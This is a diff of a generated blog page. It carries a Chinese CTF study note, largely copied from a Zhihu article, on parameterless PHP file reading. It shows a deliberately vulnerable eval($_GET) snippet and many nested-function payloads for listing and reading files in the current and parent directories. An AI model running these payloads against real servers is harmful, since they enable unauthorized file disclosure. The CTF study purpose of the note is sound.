@@ -1744,7 +1744,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1728903703248),
+    lastupdate: new Date(1728903825782),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2587,182 +2587,187 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div id="post-body" itemprop="articleBody">
     <p>做鲲鹏杯测试平台时遇到了一道无参数读取文件，学习一下相关知识，做个总结</p>
 <span id="more"></span>
+
 <p>学习链接：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/157431794">https://zhuanlan.zhihu.com/p/157431794</a></p>
 <p>感觉全篇都是精华，而且很具体，没办法去缩减基本照搬过来记录一下</p>
-<h2 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言</h2>
-<p>什么是无参数？</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>什么是无参数？</p>
 <p>顾名思义，就是只使用函数，且函数不能带有参数，这里有种种限制：比如我们选择的函数必须能接受其括号内函数的返回值；使用的函数规定必须参数为空或者为一个参数等</p>
-<h2 id="代码解析"><a class="markdownIt-Anchor" href="#代码解析">#</a> 代码解析</h2>
-<p>接下来，从代码开始讲解无参数读文件和 RCE 的具体技巧，帮助读者熟悉 PHP 的各种函数、记住无参数读文件和 RCE 的各类方法：</p>
+<h2 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h2><p>接下来，从代码开始讲解无参数读文件和RCE的具体技巧，帮助读者熟悉PHP的各种函数、记住无参数读文件和RCE的各类方法：</p>
 <p>例题：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>代码解析</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])</span><br></pre></td></tr></table></figure>
-<p>这里使用 <code>preg_replace()</code>  替换匹配到的字符为空， <code>\w</code>  匹配字母、数字和下划线，等价于  <code>[^A-Za-z0-9_]</code> ，然后 <code>(?R)?</code>  这个意思为递归整个匹配模式</p>
-<p>所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数），将匹配的替换为空，判断剩下的是否只有 <code>;</code></p>
+
+<p>这里使用<code>preg_replace()</code>替换匹配到的字符为空，<code>\w</code>匹配字母、数字和下划线，等价于 <code>[^A-Za-z0-9_]</code>，然后<code>(?R)?</code>这个意思为递归整个匹配模式</p>
+<p>所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数），将匹配的替换为空，判断剩下的是否只有<code>;</code></p>
 <p>举个例子：</p>
-<p><code>a(b(c()));</code>  可以使用，但是 <code>a('b')</code>  或者 <code>a('b','c')</code>  这种含有参数的都不能使用（我的理解时’b’和’c’在函数里会被作为参数）</p>
+<p><code>a(b(c()));</code>可以使用，但是<code>a(&#39;b&#39;)</code>或者<code>a(&#39;b&#39;,&#39;c&#39;)</code>这种含有参数的都不能使用（我的理解时’b’和’c’在函数里会被作为参数）</p>
 <p>所以我们要使用无参数的函数进行文件读取或者命令执行</p>
-<h2 id="无参数任意文件读取"><a class="markdownIt-Anchor" href="#无参数任意文件读取">#</a> 无参数任意文件读取</h2>
-<h3 id="查看当前目录文件名"><a class="markdownIt-Anchor" href="#查看当前目录文件名">#</a> 查看当前目录文件名</h3>
-<p>正常的， <code>print_r(scandir('.'));</code>  可以用来查看当前目录所有文件名，而 <code>.</code>  是不包含在 <code>\w</code>  里面导致其它函数都被转为空格，这个点没有办法被替换为空格，使得 <code>;</code>  没法等于 <code>.;</code>  没办法执行下一个 eval 函数，所以要想办法用函数来代替 <code>.</code></p>
-<h4 id="1localeconv"><a class="markdownIt-Anchor" href="#1localeconv">#</a> 1.localeconv()</h4>
-<p><code>localeconv()</code>  返回一包含本地数字及货币格式信息的数组。而数组第一项就是 <code>&quot;.&quot;</code> （后续出现的 <code>.</code>  都用双引号包裹，方便识别）</p>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/a.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/a.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<h2 id="无参数任意文件读取"><a href="#无参数任意文件读取" class="headerlink" title="无参数任意文件读取"></a>无参数任意文件读取</h2><h3 id="查看当前目录文件名"><a href="#查看当前目录文件名" class="headerlink" title="查看当前目录文件名"></a>查看当前目录文件名</h3><p>正常的，<code>print_r(scandir(&#39;.&#39;));</code>可以用来查看当前目录所有文件名，而<code>.</code>是不包含在<code>\w</code>里面导致其它函数都被转为空格，这个点没有办法被替换为空格，使得<code>;</code>没法等于<code>.;</code>没办法执行下一个eval函数，所以要想办法用函数来代替<code>.</code></p>
+<h4 id="1-localeconv"><a href="#1-localeconv" class="headerlink" title="1.localeconv()"></a>1.localeconv()</h4><p><code>localeconv()</code>返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>&quot;.&quot;</code>（后续出现的<code>.</code>都用双引号包裹，方便识别）</p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/a.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/a.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>要怎么取到这个点呢，另一个函数：</p>
-<p><code>current()</code>  返回数组中的单元，默认取第一个值</p>
+<p><code>current()</code>返回数组中的单元，默认取第一个值</p>
 <blockquote>
-<p><strong>current (localeconv ())  永远都是个点</strong></p>
+<p><strong>current(localeconv())  永远都是个点</strong></p>
 </blockquote>
 <p><code>print_r(scandir(current(localeconv())));</code></p>
-<p>或者使用 <code>print_r(scandir(pos(localeconv())));</code> ， <code>pos</code>  是 <code>current</code>  的别名</p>
-<p>如果都被过滤还可以使用 <code>reset()</code> ，该函数返回数组第一个单元的值，如果数组为空则返回 <code>FALSE</code></p>
-<h4 id="2chr46"><a class="markdownIt-Anchor" href="#2chr46">#</a> 2.chr(46)</h4>
-<p><code>chr(46)</code>  就是字符 <code>&quot;.&quot;</code></p>
-<p>要构造 46，有几个方法：</p>
+<p>或者使用<code>print_r(scandir(pos(localeconv())));</code>，<code>pos</code>是<code>current</code>的别名</p>
+<p>如果都被过滤还可以使用<code>reset()</code>，该函数返回数组第一个单元的值，如果数组为空则返回<code>FALSE</code></p>
+<h4 id="2-chr-46"><a href="#2-chr-46" class="headerlink" title="2.chr(46)"></a>2.chr(46)</h4><p><code>chr(46)</code>就是字符<code>&quot;.&quot;</code></p>
+<p>要构造46，有几个方法：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chr(rand()) (不实际，看运气)</span><br><span class="line"></span><br><span class="line">chr(time())</span><br><span class="line"></span><br><span class="line">chr(current(localtime(time())))</span><br></pre></td></tr></table></figure>
+
 <ul>
-<li><code>chr(time())</code> ：</li>
+<li><code>chr(time())</code>：</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr()`函数以256为一个周期，所以`chr(46)`,`chr(302)`,`chr(558)`都等于`&quot;.&quot;</span><br></pre></td></tr></table></figure>
-<p>所以使用 <code>chr(time())</code> ，一个周期必定出现一次 <code>&quot;.&quot;</code></p>
+
+<p>所以使用<code>chr(time())</code>，一个周期必定出现一次<code>&quot;.&quot;</code></p>
 <ul>
-<li><code>chr(current(localtime(time())))</code> ：</li>
+<li><code>chr(current(localtime(time())))</code>：</li>
 </ul>
-<p>数组第一个值每秒 + 1，所以最多 60 秒就一定能得到 46，用 <code>current(pos)</code>  就能获得 <code>&quot;.&quot;</code></p>
-<h4 id="3phpversion"><a class="markdownIt-Anchor" href="#3phpversion">#</a> 3.phpversion()</h4>
-<p><code>phpversion()</code>  返回 PHP 版本，如 <code>5.5.9</code></p>
-<p><code>floor(phpversion())</code>  返回  <code>5</code></p>
-<p><code>sqrt(floor(phpversion()))</code>  返回 <code>2.2360679774998</code></p>
-<p><code>tan(floor(sqrt(floor(phpversion()))))</code>  返回 <code>-2.1850398632615</code></p>
-<p><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>  返回 <code>4.5017381103491</code></p>
-<p><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>  返回 <code>45.081318677156</code></p>
-<p><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>  返回 <code>46</code></p>
-<p><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>  返回 <code>&quot;.&quot;</code></p>
-<h4 id="4crypt"><a class="markdownIt-Anchor" href="#4crypt">#</a> 4.crypt()</h4>
-<p><code>hebrevc(crypt(arg))</code>  可以随机生成一个 hash 值，第一个字符随机是 <code>$</code> (大概率) 或者  <code>&quot;.&quot;</code> (小概率) 然后通过 <code>chr(ord())</code>  只取第一个字符</p>
-<p>ps： <code>ord()</code>  返回字符串中第一个字符的 Ascii 值</p>
+<p>数组第一个值每秒+1，所以最多60秒就一定能得到46，用<code>current(pos)</code>就能获得<code>&quot;.&quot;</code> </p>
+<h4 id="3-phpversion"><a href="#3-phpversion" class="headerlink" title="3.phpversion()"></a>3.phpversion()</h4><p><code>phpversion()</code>返回PHP版本，如<code>5.5.9</code></p>
+<p><code>floor(phpversion())</code>返回 <code>5</code></p>
+<p><code>sqrt(floor(phpversion()))</code>返回<code>2.2360679774998</code></p>
+<p><code>tan(floor(sqrt(floor(phpversion()))))</code>返回<code>-2.1850398632615</code></p>
+<p><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>返回<code>4.5017381103491</code></p>
+<p><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>返回<code>45.081318677156</code></p>
+<p><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回<code>46</code></p>
+<p><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>返回<code>&quot;.&quot;</code></p>
+<h4 id="4-crypt"><a href="#4-crypt" class="headerlink" title="4.crypt()"></a>4.crypt()</h4><p><code>hebrevc(crypt(arg))</code>可以随机生成一个hash值，第一个字符随机是<code>$</code>(大概率) 或者 <code>&quot;.&quot;</code>(小概率) 然后通过<code>chr(ord())</code>只取第一个字符</p>
+<p>ps：<code>ord()</code>返回字符串中第一个字符的Ascii值</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">time</span>()))))));<span class="comment">//（多刷新几次）</span></span><br></pre></td></tr></table></figure>
-<p>同理： <code>strrev(crypt(serialize(array())))</code>  也可以得到 <code>&quot;.&quot;</code> ，只不过 <code>crypt(serialize(array()))</code>  的点出现在最后一个字符，需要使用 <code>strrev()</code>  逆序，然后使用 <code>chr(ord())</code>  获取第一个字符</p>
+
+<p>同理：<code>strrev(crypt(serialize(array())))</code>也可以得到<code>&quot;.&quot;</code>，只不过<code>crypt(serialize(array()))</code>的点出现在最后一个字符，需要使用<code>strrev()</code>逆序，然后使用<code>chr(ord())</code>获取第一个字符</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))));</span><br></pre></td></tr></table></figure>
-<p>PHP 的函数如此强大，获取 <code>&quot;.&quot;</code>  的方法肯定还有许多</p>
-<p>正常的，我们还可以用 <code>print_r(scandir('绝对路径'));</code>  来查看当前目录文件名</p>
-<p>获取绝对路径可用的有 <code>getcwd()</code>  和 <code>realpath('.')</code></p>
-<p>所以我们还可以用 <code>print_r(scandir(getcwd()));</code>  输出当前文件夹所有文件名</p>
-<h3 id="读取当前目录文件"><a class="markdownIt-Anchor" href="#读取当前目录文件">#</a> 读取当前目录文件</h3>
-<p>通过前面的方法输出了当前目录文件名，如果文件不能直接显示，比如 PHP 源码，我们还需要使用函数读取：</p>
+
+<p>PHP的函数如此强大，获取<code>&quot;.&quot;</code>的方法肯定还有许多</p>
+<p>正常的，我们还可以用<code>print_r(scandir(&#39;绝对路径&#39;));</code>来查看当前目录文件名</p>
+<p>获取绝对路径可用的有<code>getcwd()</code>和<code>realpath(&#39;.&#39;)</code></p>
+<p>所以我们还可以用<code>print_r(scandir(getcwd()));</code>输出当前文件夹所有文件名</p>
+<h3 id="读取当前目录文件"><a href="#读取当前目录文件" class="headerlink" title="读取当前目录文件"></a>读取当前目录文件</h3><p>通过前面的方法输出了当前目录文件名，如果文件不能直接显示，比如PHP源码，我们还需要使用函数读取：</p>
 <p>前面的方法输出的是数组，文件名是数组的值，那我们要怎么取出想要读取文件的数组呢：</p>
-<p>查询 PHP 手册发现：</p>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/b.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/b.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p>查询PHP手册发现：</p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/b.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/b.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>手册里有这些方法，如果要获取的数组是最后一个我们可以用：</p>
-<p><code>show_source(end(scandir(getcwd())));</code>  或者用 <code>readfile</code> 、 <code>highlight_file</code> 、 <code>file_get_contents</code>  等读文件函数都可以（使用 <code>readfile</code>  和 <code>file_get_contents</code>  读文件，显示在源码处）</p>
-<p>ps： <code>readgzfile()</code>  也可读文件，常用于绕过过滤</p>
-<p>介绍一个函数： <code>array_reverse()</code>  以相反的元素顺序返回数组</p>
-<p>文件本来在最后一位，反过来就成为第一位，可以直接用 <code>current(pos)</code>  读取</p>
+<p><code>show_source(end(scandir(getcwd())));</code>或者用<code>readfile</code>、<code>highlight_file</code>、<code>file_get_contents</code> 等读文件函数都可以（使用<code>readfile</code>和<code>file_get_contents</code>读文件，显示在源码处）</p>
+<p>ps：<code>readgzfile()</code>也可读文件，常用于绕过过滤</p>
+<p>介绍一个函数：<code>array_reverse()</code> 以相反的元素顺序返回数组</p>
+<p>文件本来在最后一位，反过来就成为第一位，可以直接用<code>current(pos)</code>读取</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br></pre></td></tr></table></figure>
+
 <p>如果是倒数第二个我们可以用：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br></pre></td></tr></table></figure>
+
 <p>如果不是数组的最后一个或者倒数第二个呢？</p>
-<p>我们可以使用 <code>array_rand(array_flip())</code> ， <code>array_flip()</code>  是交换数组的键和值， <code>array_rand()</code>  是随机返回一个数组</p>
+<p>我们可以使用<code>array_rand(array_flip())</code>，<code>array_flip()</code>是交换数组的键和值，<code>array_rand()</code>是随机返回一个数组</p>
 <p>所以我们可以用：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br></pre></td></tr></table></figure>
+
 <p>或者：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure>
-<p>（可以自己结合前面总结的构造 <code>&quot;.&quot;</code>  的方法切合实际过滤情况读取，后文就只列举简单的语句）</p>
-<p>多刷新几次，就读到了正着数或者倒着数都是第三位的 flag 文件</p>
-<h3 id="查看上一级目录文件名"><a class="markdownIt-Anchor" href="#查看上一级目录文件名">#</a> 查看上一级目录文件名</h3>
-<p>再介绍几个函数：</p>
-<p><code>dirname()</code>  ：返回路径中的目录部分，比如：</p>
-<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/c.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/c.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+
+<p>（可以自己结合前面总结的构造<code>&quot;.&quot;</code>的方法切合实际过滤情况读取，后文就只列举简单的语句）</p>
+<p>多刷新几次，就读到了正着数或者倒着数都是第三位的flag文件</p>
+<h3 id="查看上一级目录文件名"><a href="#查看上一级目录文件名" class="headerlink" title="查看上一级目录文件名"></a>查看上一级目录文件名</h3><p>再介绍几个函数：</p>
+<p><code>dirname()</code> ：返回路径中的目录部分，比如：</p>
+<p><img src="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/c.png" class="lazyload" data-srcset="/2023/04/21/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8Crce%E6%80%BB%E7%BB%93/c.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>从图中可以看出，如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径</p>
-<p><code>chdir()</code>  ：改变当前工作目录</p>
-<h4 id="dirname方法"><a class="markdownIt-Anchor" href="#dirname方法">#</a> dirname () 方法</h4>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))); <span class="comment">//查看上一级目录的文件</span></span><br></pre></td></tr></table></figure>
-<p>构造 <code>&quot;..&quot;</code></p>
-<p><code>print_r(next(scandir(getcwd())));</code> ：我们 <code>scandir(getcwd())</code>  出现的数组第二个就是 <code>&quot;..&quot;</code> ，所以可以用 <code>next()</code>  获取</p>
+<p><code>chdir()</code> ：改变当前工作目录</p>
+<h4 id="dirname-方法"><a href="#dirname-方法" class="headerlink" title="dirname()方法"></a>dirname()方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))); <span class="comment">//查看上一级目录的文件</span></span><br></pre></td></tr></table></figure>
+
+<p>构造<code>&quot;..&quot;</code></p>
+<p><code>print_r(next(scandir(getcwd())));</code>：我们<code>scandir(getcwd())</code>出现的数组第二个就是<code>&quot;..&quot;</code>，所以可以用<code>next()</code>获取</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));<span class="comment">//也可查看上级目录文件</span></span><br></pre></td></tr></table></figure>
-<p>结合上文的一些构造都是可以获得 <code>&quot;..&quot;</code>  的 ：</p>
+
+<p>结合上文的一些构造都是可以获得<code>&quot;..&quot;</code>的 ：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">time</span>()))))))</span><br></pre></td></tr></table></figure>
-<h3 id="读取上级目录文件"><a class="markdownIt-Anchor" href="#读取上级目录文件">#</a> 读取上级目录文件</h3>
-<p>直接 <code>print_r(readfile(array_rand(array_flip(scandir(dirname(getcwd()))))));</code>  是不可以的，会报错，因为默认是在当前工作目录寻找并读取这个文件，而这个文件在上一层目录，所以要先改变当前工作目录</p>
-<p>前面写到了 <code>chdir()</code> ，使用：</p>
+
+<h3 id="读取上级目录文件"><a href="#读取上级目录文件" class="headerlink" title="读取上级目录文件"></a>读取上级目录文件</h3><p>直接<code>print_r(readfile(array_rand(array_flip(scandir(dirname(getcwd()))))));</code>是不可以的，会报错，因为默认是在当前工作目录寻找并读取这个文件，而这个文件在上一层目录，所以要先改变当前工作目录</p>
+<p>前面写到了<code>chdir()</code>，使用：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())))))));</span><br></pre></td></tr></table></figure>
+
 <p>即可改变当前目录为上一层目录并读取文件</p>
-<p>如果不能使用 <code>dirname()</code> ，可以使用构造 <code>&quot;..&quot;</code>  的方式切换路径并读取：</p>
-<p>但是这里切换路径后 <code>getcwd()</code>  和 <code>localeconv()</code>  不能接收参数，因为语法不允许，我们可以用之前的 <code>hebrevc(crypt(arg))</code></p>
-<p>这里 <code>crypt()</code>  和 <code>time()</code>  可以接收参数，于是构造：</p>
+<p>如果不能使用<code>dirname()</code>，可以使用构造<code>&quot;..&quot;</code>的方式切换路径并读取：</p>
+<p>但是这里切换路径后<code>getcwd()</code>和<code>localeconv()</code>不能接收参数，因为语法不允许，我们可以用之前的<code>hebrevc(crypt(arg))</code></p>
+<p>这里<code>crypt()</code>和<code>time()</code>可以接收参数，于是构造：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())))))))))));</span><br><span class="line">或更复杂的：</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">phpversion</span>())))))))))))))));</span><br><span class="line">还可以用：</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localtime</span>(<span class="title function_ invoke__">time</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>()))))))))))));<span class="comment">//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位</span></span><br></pre></td></tr></table></figure>
+
 <p>多刷新几次</p>
-<p>还有一种构造方法 <code>if()</code> ：（这种更直观些，并且不需要找可接收参数的函数）</p>
+<p>还有一种构造方法<code>if()</code>：（这种更直观些，并且不需要找可接收参数的函数）</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))))<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br></pre></td></tr></table></figure>
-<h3 id="查看和读取根目录文件"><a class="markdownIt-Anchor" href="#查看和读取根目录文件">#</a> 查看和读取根目录文件</h3>
